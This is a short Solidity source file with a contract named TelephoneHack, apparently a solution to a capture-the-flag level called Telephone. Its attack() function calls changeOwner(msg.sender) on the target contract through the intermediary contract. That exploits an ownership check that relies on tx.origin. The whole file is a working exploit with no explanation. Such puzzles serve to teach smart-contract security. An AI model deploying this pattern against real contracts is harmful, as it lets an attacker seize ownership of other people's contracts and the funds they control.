// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone telephone;

    constructor(address _telephoneContract) {
        telephone = ITelephone(_telephoneContract);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}
